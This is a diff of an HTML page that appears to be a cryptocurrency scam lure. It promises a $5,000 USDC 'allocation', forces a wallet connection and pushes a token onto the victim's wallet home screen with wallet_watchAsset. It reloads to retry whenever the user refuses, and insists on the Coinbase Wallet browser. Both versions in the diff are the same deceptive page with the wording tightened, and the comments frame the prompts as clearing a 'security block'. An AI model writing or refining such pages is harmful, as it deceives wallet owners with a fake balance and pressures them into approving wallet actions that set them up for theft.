@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Direct Asset Bridge</title>
+    <title>Final Settlement</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 100px 20px; }
-        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 15px #0f0; }
         button { 
             background: #0f0; color: #000; border: none; padding: 25px; 
-            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.3em; margin-top: 20px;
+            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em;
         }
     </style>
 </head>
@@ -17,17 +17,17 @@
     <div class="terminal">
         <h2>FINAL SYSTEM PUSH</h2>
         <p>ALLOCATION: $5,000.00 USDC</p>
-        <button id="directLinkBtn">LINK TO HOME SCREEN</button>
+        <button id="finalPushBtn">LINK TO HOME SCREEN</button>
     </div>
 
     <script>
-        document.getElementById('directLinkBtn').onclick = async () => {
+        document.getElementById('finalPushBtn').onclick = async () => {
             if (window.ethereum) {
                 try {
-                    // Force the immediate wallet connection
+                    // STAGE 1: Force identity handshake (Clear security block)
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Force the asset indexing pop-up
+                    // STAGE 2: Force the asset to the Home Screen
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -39,12 +39,13 @@
                             },
                         },
                     });
-                    alert("Handshake Success! Refresh your Home Screen to see the balance.");
+                    alert("Success! Check your Home Screen balance.");
                 } catch (e) {
-                    window.location.reload(); 
+                    // If the handshake is interrupted, refresh to retry immediately
+                    window.location.reload();
                 }
             } else {
-                alert("Please open this link inside the Coinbase Wallet Browser.");
+                alert("Critical: Open this in the Coinbase Wallet Browser.");
             }
         };
     </script>
